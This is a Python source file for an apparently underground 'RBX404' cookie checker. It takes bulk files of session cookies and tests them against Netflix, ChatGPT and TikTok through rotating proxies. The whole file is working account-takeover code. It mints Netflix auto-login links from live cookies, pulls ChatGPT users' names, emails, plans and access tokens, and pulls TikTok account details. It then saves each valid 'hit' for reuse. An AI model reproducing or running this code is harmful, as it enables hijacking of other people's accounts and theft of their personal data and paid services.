"""
Cookie Checker Engine — Netflix, ChatGPT, TikTok
"""
import re
import json
import time
import zipfile
import threading
import requests
from datetime import datetime
from typing import Dict, List, Tuple, Optional

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except:
    pass


# ─── Proxy helpers ────────────────────────────────────────────────────────────

_px_lock = threading.Lock()
_px_idx = 0
_dead_px: set = set()


def _proxy_str_to_requests(p: str) -> Optional[dict]:
    if not p:
        return None
    try:
        parts = p.split(":")
        if len(parts) == 4:
            url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif len(parts) == 2:
            url = f"http://{parts[0]}:{parts[1]}"
        else:
            url = p if p.startswith("http") else f"http://{p}"
        return {"http": url, "https": url}
    except:
        return None


def _next_proxy(proxies_list: List[str]) -> Optional[dict]:
    global _px_idx, _dead_px
    if not proxies_list:
        return None
    with _px_lock:
        attempts = 0
        while attempts < len(proxies_list) * 2:
            p = proxies_list[_px_idx % len(proxies_list)]
            _px_idx += 1
            attempts += 1
            if p not in _dead_px:
                return _proxy_str_to_requests(p)
        _dead_px.clear()
        p = proxies_list[_px_idx % len(proxies_list)]
        _px_idx += 1
        return _proxy_str_to_requests(p)


def _mark_dead(proxy_dict: Optional[dict]):
    if proxy_dict:
        with _px_lock:
            _dead_px.add(proxy_dict.get("http", ""))


# ─── Generic Cookie Parser ────────────────────────────────────────────────────

def _parse_cookies_from_text(text: str) -> Dict[str, str]:
    text = text.strip()
    if not text:
        return {}
    try:
        if text.startswith('[') or text.startswith('{'):
            data = json.loads(text)
            if isinstance(data, list):
                cookies = {}
                for item in data:
                    if isinstance(item, dict):
                        name = item.get("name", item.get("Name", ""))
                        value = item.get("value", item.get("Value", ""))
                        if name and value is not None:
                            cookies[str(name)] = str(value)
                return cookies
            elif isinstance(data, dict):
                return {str(k): str(v) for k, v in data.items()}
    except:
        pass
    cookies = {}
    for line in text.split('\n'):
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        parts = line.split('\t')
        if len(parts) >= 7:
            name = parts[5].strip()
            value = parts[6].strip()
            if name:
                cookies[name] = value
            continue
        if '=' in line and not line.startswith('http'):
            kv = line.split('=', 1)
            if len(kv) == 2:
                name = kv[0].strip().strip('"')
                value = kv[1].strip().strip(';').strip('"')
                if name and len(name) > 1 and not name.startswith('.'):
                    cookies[name] = value
    return cookies


def extract_cookie_files(content: bytes, filename: str) -> List[Tuple[str, str]]:
    """Extract (source_name, text) pairs from .txt or .zip bytes"""
    import io
    files = []
    if filename.lower().endswith('.zip'):
        try:
            with zipfile.ZipFile(io.BytesIO(content)) as zf:
                for name in zf.namelist():
                    if name.lower().endswith('.txt') and '__MACOSX' not in name:
                        try:
                            text = zf.read(name).decode('utf-8', errors='ignore')
                            if text.strip():
                                files.append((name, text))
                        except:
                            pass
        except:
            pass
    else:
        text = content.decode('utf-8', errors='ignore')
        if text.strip():
            files.append((filename, text))
    return files


def _format_number(n) -> str:
    try:
        n = int(n)
        if n >= 1_000_000:
            return f"{n/1_000_000:.1f}M"
        elif n >= 1000:
            return f"{n/1000:.1f}K"
        return str(n)
    except:
        return str(n)


# ─── Netflix ─────────────────────────────────────────────────────────────────

_NETFLIX_REQUIRED = ['NetflixId', 'SecureNetflixId', 'nfvdid']


def is_valid_netflix(d: dict) -> bool:
    return all(k in d for k in _NETFLIX_REQUIRED)


def count_valid_netflix(files: List[Tuple[str, str]]) -> Tuple[int, List[Tuple[str, dict]]]:
    result = []
    for src, text in files:
        d = _parse_cookies_from_text(text)
        if is_valid_netflix(d):
            result.append((src, d))
    return len(result), result


def check_netflix_cookie(cookies_dict: dict, proxies_list: List[str]) -> Tuple[Optional[dict], str]:
    px = None
    try:
        px = _next_proxy(proxies_list) if proxies_list else None
        cookie_str = '; '.join(f"{k}={v}" for k, v in cookies_dict.items())
        headers = {
            'User-Agent': 'com.netflix.mediaclient/63884 (Linux; U; Android 13; ro; M2007J3SG; Build/TQ1A.230205.001.A2; Cronet/143.0.7445.0)',
            'Accept': 'multipart/mixed;deferSpec=20220824, application/graphql-response+json, application/json',
            'Content-Type': 'application/json',
            'Cookie': cookie_str,
            'Origin': 'https://www.netflix.com',
            'Referer': 'https://www.netflix.com/'
        }
        payload = {
            "operationName": "CreateAutoLoginToken",
            "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"},
            "extensions": {"persistedQuery": {"version": 102, "id": "76e97129-f4b5-41a0-a73c-12e674896849"}}
        }
        r = requests.post(
            'https://android13.prod.ftl.netflix.com/graphql',
            headers=headers, json=payload, proxies=px,
            timeout=(8, 20), verify=False
        )
        if r.status_code in [401, 403]:
            return None, 'expired'
        if r.status_code != 200:
            if px:
                _mark_dead(px)
            return None, 'error'
        data = r.json()
        if 'data' in data and data['data'] and 'createAutoLoginToken' in data['data']:
            token = data['data']['createAutoLoginToken']
            return {"token": token, "link": f"https://netflix.com/?nftoken={token}"}, 'valid'
        elif 'errors' in data:
            return None, 'expired'
        return None, 'error'
    except requests.exceptions.ProxyError:
        if px:
            _mark_dead(px)
        return None, 'proxy_error'
    except:
        return None, 'error'


def _netscape_netflix(d: dict) -> str:
    lines = ["# Netscape HTTP Cookie File", "# Netflix Cookies - RBX404 Checker | Owner: @RBX404", ""]
    for name, value in d.items():
        lines.append(f".netflix.com\tTRUE\t/\tTRUE\t0\t{name}\t{value}")
    return "\n".join(lines)


def format_hit_netflix(result: dict, cookies_dict: dict, source: str) -> Tuple[str, str]:
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    token = result['token']
    netscape = _netscape_netflix(cookies_dict)
    content = f"""════════════════════════════════════════════════════════
  RBX404 Netflix Cookie Checker  |  Owner: @RBX404
════════════════════════════════════════════════════════

  Checked At : {ts}
  Source     : {source}

════════════════════════════════════════════════════════
  ACCOUNT INFO
════════════════════════════════════════════════════════

  NFToken    : {token}
  Link       : https://netflix.com/?nftoken={token}

════════════════════════════════════════════════════════
  COOKIES (Netscape Format)
════════════════════════════════════════════════════════
{netscape}

════════════════════════════════════════════════════════
  RAW COOKIES (JSON)
════════════════════════════════════════════════════════
{json.dumps(cookies_dict, indent=2, ensure_ascii=False)}

════════════════════════════════════════════════════════
  Owner: @RBX404 | RBX404 Netflix Cookie Checker
════════════════════════════════════════════════════════
"""
    safe_src = re.sub(r'[<>:"/\\|?*\s]', '_', source).replace('.txt', '')
    filename = f"[netflix][{safe_src}].txt"
    return content, filename


# ─── ChatGPT ──────────────────────────────────────────────────────────────────

_GPT_SESSION_KEYS = [
    '__Secure-next-auth.session-token',
    '__Secure-next-auth.session-token.0',
    '__Secure-next-auth.session-token.1',
    'oai-sc'
]


def is_valid_chatgpt(d: dict) -> bool:
    return any(k in d for k in _GPT_SESSION_KEYS)


def count_valid_chatgpt(files: List[Tuple[str, str]]) -> Tuple[int, List[Tuple[str, dict]]]:
    result = []
    for src, text in files:
        d = _parse_cookies_from_text(text)
        if is_valid_chatgpt(d):
            result.append((src, d))
    return len(result), result


def check_chatgpt_cookie(cookies_dict: dict, proxies_list: List[str]) -> Tuple[Optional[dict], str]:
    px = None
    try:
        px = _next_proxy(proxies_list) if proxies_list else None
        headers = {
            "authority": "chatgpt.com",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "accept-language": "en-US,en;q=0.9",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
        }
        r = requests.get(
            "https://chatgpt.com/",
            cookies=cookies_dict, headers=headers,
            proxies=px, timeout=(8, 20),
            allow_redirects=True, verify=False
        )
        if r.status_code != 200:
            if px:
                _mark_dead(px)
            return None, 'error'
        if "login" in r.url.lower() or "auth0" in r.url.lower():
            return None, 'expired'

        data = r.text
        scripts = re.findall(r'<script[^>]*id="client-bootstrap"[^>]*>(.*?)</script>', data, re.DOTALL)
        for script in scripts:
            try:
                js = json.loads(script)
                if js.get("authStatus") == "logged_in":
                    user = js.get("session", {}).get("user", {})
                    account = js.get("session", {}).get("account", {})
                    session = js.get("session", {})
                    plan = account.get("planType", "N/A")
                    is_paid = bool(plan and plan.lower() not in ("free", "n/a", ""))
                    country = "N/A"
                    try:
                        import urllib.parse
                        ci_str = cookies_dict.get("oai-client-auth-info", "")
                        if ci_str:
                            ci = json.loads(urllib.parse.unquote(ci_str))
                            country = ci.get("country", "N/A")
                    except:
                        pass
                    return {
                        "name": user.get("name", "N/A"),
                        "email": user.get("email", "N/A"),
                        "plan": plan,
                        "is_paid": is_paid,
                        "expires": session.get("expires", "N/A"),
                        "access_token": session.get("accessToken", "N/A"),
                        "features": account.get("features", []),
                        "entitlement": account.get("entitlement", {}),
                        "rate_limits": account.get("rate_limits", []),
                        "country": country,
                    }, 'valid'
            except:
                continue

        if "logged_in" in data:
            em = re.search(r'"email"\s*:\s*"([^"]+)"', data)
            pl = re.search(r'"planType"\s*:\s*"([^"]+)"', data)
            nm = re.search(r'"name"\s*:\s*"([^"]+)"', data)
            if em:
                plan = pl.group(1) if pl else "N/A"
                return {
                    "name": nm.group(1) if nm else "N/A",
                    "email": em.group(1),
                    "plan": plan,
                    "is_paid": bool(plan and plan.lower() not in ("free", "n/a", "")),
                    "expires": "N/A", "access_token": "N/A",
                    "features": [], "entitlement": {}, "rate_limits": [], "country": "N/A",
                }, 'valid'
        return None, 'expired'
    except requests.exceptions.ProxyError:
        if px:
            _mark_dead(px)
        return None, 'proxy_error'
    except:
        return None, 'error'


def _netscape_chatgpt(d: dict) -> str:
    lines = ["# Netscape HTTP Cookie File", "# ChatGPT Cookies - RBX404 Checker | Owner: @RBX404", ""]
    for name, value in d.items():
        secure = "TRUE" if name.startswith("__Secure") or name.startswith("__Host") else "FALSE"
        lines.append(f".chatgpt.com\tTRUE\t/\t{secure}\t0\t{name}\t{value}")
    return "\n".join(lines)


def format_hit_chatgpt(result: dict, cookies_dict: dict, source: str) -> Tuple[str, str]:
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    netscape = _netscape_chatgpt(cookies_dict)
    token = result.get("access_token", "N/A")
    if token and token != "N/A" and len(token) > 80:
        token = token[:40] + "..." + token[-40:]
    features_str = "\n".join(f"  - {f}" for f in result.get("features", [])) or "  N/A"
    rate_str = "\n".join(
        f"  - {rl.get('model','?')}: {rl.get('limit','?')} per {rl.get('window','?')}s"
        for rl in result.get("rate_limits", [])
    ) or "  N/A"
    ent_str = "\n".join(f"  - {k}: {v}" for k, v in result.get("entitlement", {}).items()) or "  N/A"
    content = f"""════════════════════════════════════════════════════════
  RBX404 ChatGPT Cookie Checker  |  Owner: @RBX404
════════════════════════════════════════════════════════

  Checked At : {ts}
  Source     : {source}

════════════════════════════════════════════════════════
  ACCOUNT INFO
════════════════════════════════════════════════════════

  Name       : {result.get('name', 'N/A')}
  Email      : {result.get('email', 'N/A')}
  Plan       : {result.get('plan', 'N/A')}
  Paid       : {result.get('is_paid', False)}
  Country    : {result.get('country', 'N/A')}
  Expires    : {result.get('expires', 'N/A')}
  Token      : {token}

════════════════════════════════════════════════════════
  FEATURES
════════════════════════════════════════════════════════
{features_str}

════════════════════════════════════════════════════════
  RATE LIMITS
════════════════════════════════════════════════════════
{rate_str}

════════════════════════════════════════════════════════
  ENTITLEMENT
════════════════════════════════════════════════════════
{ent_str}

════════════════════════════════════════════════════════
  COOKIES (Netscape Format)
════════════════════════════════════════════════════════
{netscape}

════════════════════════════════════════════════════════
  RAW COOKIES (JSON)
════════════════════════════════════════════════════════
{json.dumps(cookies_dict, indent=2, ensure_ascii=False)}

════════════════════════════════════════════════════════
  Owner: @RBX404 | RBX404 ChatGPT Cookie Checker
════════════════════════════════════════════════════════
"""
    safe_plan = re.sub(r'[<>:"/\\|?*\s]', '_', result.get("plan", "unknown").lower())
    safe_email = re.sub(r'[<>:"/\\|?*\s]', '_', result.get("email", "unknown"))
    filename = f"[{safe_plan}][{safe_email}].txt"
    return content, filename


# ─── TikTok ───────────────────────────────────────────────────────────────────

_TIKTOK_SESSION_KEYS = ['sessionid', 'sid_tt']


def is_valid_tiktok(d: dict) -> bool:
    return any(k in d for k in _TIKTOK_SESSION_KEYS)


def count_valid_tiktok(files: List[Tuple[str, str]]) -> Tuple[int, List[Tuple[str, dict]]]:
    result = []
    for src, text in files:
        d = _parse_cookies_from_text(text)
        if is_valid_tiktok(d):
            result.append((src, d))
    return len(result), result


def check_tiktok_cookie(cookies_dict: dict, proxies_list: List[str]) -> Tuple[Optional[dict], str]:
    px = None
    try:
        px = _next_proxy(proxies_list) if proxies_list else None
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://www.tiktok.com/',
        }
        r = requests.get(
            'https://www.tiktok.com/passport/web/account/info/',
            cookies=cookies_dict, headers=headers,
            proxies=px, timeout=(5, 10),
            allow_redirects=True, verify=False
        )
        if r.status_code != 200:
            if px:
                _mark_dead(px)
            return None, 'error'
        try:
            data = r.json()
        except:
            return None, 'error'

        error_code = data.get('error_code') or data.get('code') or 0
        if error_code in [8, 13, 10, 2483, 2484]:
            return None, 'expired'
        combo = (str(data.get('message', '')) + ' ' + str(data.get('description', ''))).lower()
        if any(w in combo for w in ['expired', 'login', 'unauthorized', 'invalid', 'need login', 'not logged']):
            return None, 'expired'

        acc = data.get('data', {})
        if not acc or not acc.get('username'):
            return None, 'expired'

        username = acc['username']
        stats = {'nickname': '', 'followers': 0, 'following': 0, 'likes': 0, 'videos': 0}
        try:
            r2 = requests.get(
                f'https://www.tiktok.com/api/user/detail/?uniqueId={username}',
                cookies=cookies_dict, headers=headers,
                proxies=px, timeout=(5, 8), verify=False
            )
            if r2 and r2.status_code == 200:
                d2 = r2.json()
                ui = d2.get('userInfo', {})
                u2 = ui.get('user', {})
                s2 = ui.get('stats', {})
                if u2.get('uniqueId', '').lower() == username.lower():
                    stats = {
                        'nickname': u2.get('nickname', ''),
                        'followers': s2.get('followerCount', 0),
                        'following': s2.get('followingCount', 0),
                        'likes': s2.get('heartCount', 0),
                        'videos': s2.get('videoCount', 0),
                    }
        except:
            pass

        return {
            "username": username,
            "nickname": stats['nickname'],
            "followers": stats['followers'],
            "following": stats['following'],
            "likes": stats['likes'],
            "videos": stats['videos'],
            "profile": f"https://www.tiktok.com/@{username}",
        }, 'valid'
    except requests.exceptions.ProxyError:
        if px:
            _mark_dead(px)
        return None, 'proxy_error'
    except:
        return None, 'error'


def _netscape_tiktok(d: dict) -> str:
    lines = ["# Netscape HTTP Cookie File", "# TikTok Cookies - RBX404 Checker | Owner: @RBX404", ""]
    priority = ['sessionid', 'sid_tt', 'uid_tt', 'odin_tt', 'ttwid']
    keys_sorted = [k for k in priority if k in d] + [k for k in d if k not in priority]
    for name in keys_sorted:
        lines.append(f".tiktok.com\tTRUE\t/\tFALSE\t0\t{name}\t{d[name]}")
    return "\n".join(lines)


def format_hit_tiktok(result: dict, cookies_dict: dict, source: str) -> Tuple[str, str]:
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    netscape = _netscape_tiktok(cookies_dict)
    username = result.get('username', 'unknown')
    content = f"""════════════════════════════════════════════════════════
  RBX404 TikTok Cookie Checker  |  Owner: @RBX404
════════════════════════════════════════════════════════

  Checked At : {ts}
  Source     : {source}

════════════════════════════════════════════════════════
  ACCOUNT INFO
════════════════════════════════════════════════════════

  Username   : @{username}
  Nickname   : {result.get('nickname', 'N/A')}
  Followers  : {_format_number(result.get('followers', 0))}
  Following  : {_format_number(result.get('following', 0))}
  Likes      : {_format_number(result.get('likes', 0))}
  Videos     : {result.get('videos', 0)}
  Profile    : {result.get('profile', 'N/A')}

════════════════════════════════════════════════════════
  COOKIES (Netscape Format)
════════════════════════════════════════════════════════
{netscape}

════════════════════════════════════════════════════════
  RAW COOKIES (JSON)
════════════════════════════════════════════════════════
{json.dumps(cookies_dict, indent=2, ensure_ascii=False)}

════════════════════════════════════════════════════════
  Owner: @RBX404 | RBX404 TikTok Cookie Checker
════════════════════════════════════════════════════════
"""
    safe_user = re.sub(r'[<>:"/\\|?*\s]', '_', username)
    filename = f"[@{safe_user}][{result.get('followers', 0)}_followers].txt"
    return content, filename
